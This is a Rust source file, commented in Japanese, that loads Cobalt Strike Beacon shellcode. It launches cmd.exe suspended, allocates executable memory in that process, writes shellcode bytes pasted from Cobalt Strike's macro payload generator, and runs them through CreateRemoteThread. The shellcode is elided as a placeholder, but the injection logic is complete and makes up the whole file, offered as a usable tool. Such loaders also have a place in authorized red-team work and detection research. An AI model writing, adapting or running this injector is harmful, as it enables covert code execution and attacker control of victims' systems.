/* CobaltStrike の Beacon シェルコードを実行するプログラム
 * 
 * CobaltStrike の [Payloads] ⇒ [MS Office Macro] からシェルコードを抽出して、textに貼り付け
 * Programは32bitで動作 ⇒ [MS Office Macro] から生成されるシェルコードは32bitのため
*/

use std::ptr::{null_mut, null};
use std::ffi::CString;
use std::mem::{zeroed};
use std::mem::transmute;

use winapi::ctypes::{c_void};
use winapi::um::processthreadsapi::CreateRemoteThread;
use winapi::um::processthreadsapi::{CreateProcessA, PROCESS_INFORMATION, STARTUPINFOA};
use winapi::um::winbase::CREATE_SUSPENDED;
use winapi::shared::ntdef::PSTR;
use winapi::um::memoryapi::{VirtualAllocEx,WriteProcessMemory};
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_READWRITE};

use winapi::shared::minwindef::{LPCVOID};

fn print_typename<T>(_: T) {
    println!("{}", std::any::type_name::<T>());
}

fn main() {
    
    unsafe {
        // ここにCobaltStrikeのシェルコードを格納する。
        //
        let text = "-4,.......,-31";
        // スプリットして文字列の配列にする

        let numbers: Vec<&str> = text.split(',').collect();

        // 文字列の配列からi16型のベクタに変換する
        let mut buf: Vec<i16> = Vec::new();
        for number in numbers {
            if let Ok(parsed) = number.trim().parse::<i16>() {
                buf.push(parsed);
            } else {
                println!("Failed to parse {}", number);
            }
        }
        println!("{:?}", buf);


        let target = CString::new("C:\\Windows\\SysWOW64\\cmd.exe").expect("CString::new failed");
        let mut startup_info: STARTUPINFOA = zeroed();
        let mut process_info: PROCESS_INFORMATION = zeroed();

        //引数が１なら成功
        let process = CreateProcessA(
            null(),
            target.as_ptr() as PSTR,
            null_mut(),
            null_mut(),
            0,
            CREATE_SUSPENDED,
            null_mut(),
            null_mut(),
            &mut startup_info,
            &mut process_info,
        );  
        println!("Bytes: {:?}", process);

        let address = VirtualAllocEx(
            process_info.hProcess,
            null_mut(),
            buf.len(),
            MEM_COMMIT | MEM_RESERVE,
             PAGE_EXECUTE
        );

        print_typename(address);
        
        for i in 0..buf.len() {

            let addr = (address as *mut i8).offset(i as isize) as *mut c_void;

            let byte = buf[i] as u8;
            WriteProcessMemory(process_info.hProcess, addr, &byte as *const u8 as LPCVOID, 1, null_mut());
        }

        let func = transmute(address);
        CreateRemoteThread(process_info.hProcess,null_mut(), 0, func, null_mut(),0, null_mut());
    }   
}

